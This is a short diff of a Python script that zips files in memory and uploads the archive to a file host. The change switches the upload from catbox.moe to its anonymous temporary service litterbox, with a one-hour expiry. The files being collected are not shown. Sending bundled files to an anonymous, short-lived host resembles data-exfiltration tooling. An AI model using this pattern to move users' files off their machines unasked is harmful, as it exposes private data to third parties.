@@ -17,8 +17,11 @@ def zip_files_to_memory():
     return zip_buffer
 
 def upload_to_catbox(zip_buffer):
-    url = "https://catbox.moe/user/api.php"
-    data = {"reqtype": "fileupload"}
+    url = "https://litterbox.catbox.moe/resources/internals/api.php"
+    data = {
+        "reqtype": "fileupload",
+        "time": "1h",
+    }
     
     response = requests.post(url, data=data, files={"fileToUpload": ("archive.zip", zip_buffer)})
     if response.status_code == 200:
